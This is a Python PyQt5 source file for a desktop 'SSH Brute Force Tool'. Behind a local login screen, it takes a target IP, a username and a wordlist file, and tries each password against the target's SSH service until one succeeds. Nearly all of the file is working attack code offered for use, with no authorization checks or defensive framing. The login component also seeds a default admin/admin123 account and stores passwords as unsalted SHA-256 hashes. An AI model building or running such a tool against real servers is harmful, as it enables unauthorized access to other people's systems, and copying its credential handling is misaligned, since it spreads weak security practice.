import sys
import json
import os
import paramiko
import hashlib
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QLabel, QLineEdit, QPushButton,
    QTextEdit, QFileDialog, QVBoxLayout, QWidget, QProgressBar,
    QMessageBox
)
from PyQt5.QtCore import QThread, pyqtSignal

USERS_FILE = "users.json"


# ---------- PASSWORD HASHING ----------
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()


# ---------- USER MANAGEMENT ----------
def load_users():
    if not os.path.exists(USERS_FILE):
        with open(USERS_FILE, "w") as f:
            json.dump(
                {"admin": hash_password("admin123")},
                f,
                indent=4
            )
    with open(USERS_FILE, "r") as f:
        return json.load(f)


def save_users(users):
    with open(USERS_FILE, "w") as f:
        json.dump(users, f, indent=4)


# ---------- LOGIN WINDOW ----------
class LoginWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.users = load_users()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("User Login / Sign Up")
        self.setGeometry(500, 300, 400, 300)

        layout = QVBoxLayout()

        self.label_user = QLabel("Username:")
        self.input_user = QLineEdit()

        self.label_pass = QLabel("Password:")
        self.input_pass = QLineEdit()
        self.input_pass.setEchoMode(QLineEdit.Password)

        self.btn_login = QPushButton("Login")
        self.btn_signup = QPushButton("Sign Up")

        self.btn_login.clicked.connect(self.login)
        self.btn_signup.clicked.connect(self.signup)

        layout.addWidget(self.label_user)
        layout.addWidget(self.input_user)
        layout.addWidget(self.label_pass)
        layout.addWidget(self.input_pass)
        layout.addWidget(self.btn_login)
        layout.addWidget(self.btn_signup)

        self.setLayout(layout)
        self.setStyleSheet("""
            QWidget {
                background-color: black;
                color: darkorange;
                font-size: 16px;
            }
            QLineEdit {
                background-color: #111;
                color: white;
                border: 1px solid white;
            }
            QPushButton {
                background-color: #111;
                color: white;
                border: 1px solid white;
                padding: 8px;
            }
            QPushButton:hover {
                background-color: #003300;
            }
        """)

    def login(self):
        user = self.input_user.text()
        pwd = self.input_pass.text()
        hashed_pwd = hash_password(pwd)

        if user in self.users and self.users[user] == hashed_pwd:
            QMessageBox.information(self, "Success", "Login Successful")
            self.main = SSHBruteForceApp()
            self.main.show()
            self.close()
        else:
            QMessageBox.warning(self, "Error", "Invalid username or password")

    def signup(self):
        user = self.input_user.text()
        pwd = self.input_pass.text()

        if not user or not pwd:
            QMessageBox.warning(self, "Error", "Fields cannot be empty")
            return

        if user in self.users:
            QMessageBox.warning(self, "Error", "User already exists")
            return

        self.users[user] = hash_password(pwd)
        save_users(self.users)
        QMessageBox.information(self, "Success", "User registered successfully")


# ---------- BRUTE FORCE THREAD ----------
class BruteForceWorker(QThread):
    progress = pyqtSignal(int)
    log = pyqtSignal(str)

    def __init__(self, target_ip, username, passwords):
        super().__init__()
        self.target_ip = target_ip
        self.username = username
        self.passwords = passwords

    def run(self):
        total = len(self.passwords)
        try:
            with paramiko.SSHClient() as client:
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                for i, password in enumerate(self.passwords):
                    password = password.strip()
                    try:
                        self.log.emit(f"[Attempt] {password}")
                        client.connect(
                            hostname=self.target_ip,
                            username=self.username,
                            password=password,
                            timeout=5
                        )
                        self.log.emit(f"[SUCCESS] Password Found: {password}")
                        self.progress.emit(100)
                        return
                    except:
                        self.log.emit("[FAILED]")
                    self.progress.emit(int((i + 1) / total * 100))
        except Exception as e:
            self.log.emit(str(e))


# ---------- MAIN APPLICATION ----------
class SSHBruteForceApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("SSH Brute Force Tool")
        self.setGeometry(400, 400, 800, 600)

        layout = QVBoxLayout()

        self.input_ip = QLineEdit()
        self.input_user = QLineEdit()
        self.input_file = QLineEdit()

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)

        self.progress = QProgressBar()

        btn_browse = QPushButton("Browse Password File")
        btn_start = QPushButton("Start Attack")

        btn_browse.clicked.connect(self.browse)
        btn_start.clicked.connect(self.start_attack)

        layout.addWidget(QLabel("Target IP:"))
        layout.addWidget(self.input_ip)
        layout.addWidget(QLabel("Username:"))
        layout.addWidget(self.input_user)
        layout.addWidget(QLabel("Password File:"))
        layout.addWidget(self.input_file)
        layout.addWidget(btn_browse)
        layout.addWidget(self.log_box)
        layout.addWidget(self.progress)
        layout.addWidget(btn_start)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)
        self.setStyleSheet("""
            QWidget {
                background-color: black;
                color: white;
                font-size: 16px;
            }

            QLineEdit, QTextEdit {
                background-color: #111111;
                color: darkgreen;
                border: 2px solid white;
            }

            QPushButton {
                background-color: #111111;
                color: darkgreen;
                border: 1px solid white;
                padding: 8px;
            }

            QPushButton:hover {
                background-color: #003300;
            }

            QProgressBar {
                border: 1px solid white;
                text-align: center;
                color: white;
            }

            QProgressBar::chunk {
                background-color: white;
            }
        """)

    def browse(self):
        file, _ = QFileDialog.getOpenFileName(self, "Select File")
        if file:
            self.input_file.setText(file)

    def start_attack(self):
        try:
            with open(self.input_file.text(), "r") as f:
                passwords = f.readlines()
        except:
            self.log_box.append("Invalid password file")
            return

        self.worker = BruteForceWorker(
            self.input_ip.text(),
            self.input_user.text(),
            passwords
        )
        self.worker.log.connect(self.log_box.append)
        self.worker.progress.connect(self.progress.setValue)
        self.worker.start()


# ---------- MAIN ----------
if __name__ == "__main__":
    app = QApplication(sys.argv)
    login = LoginWindow()
    login.show()
    sys.exit(app.exec_())

        

        

   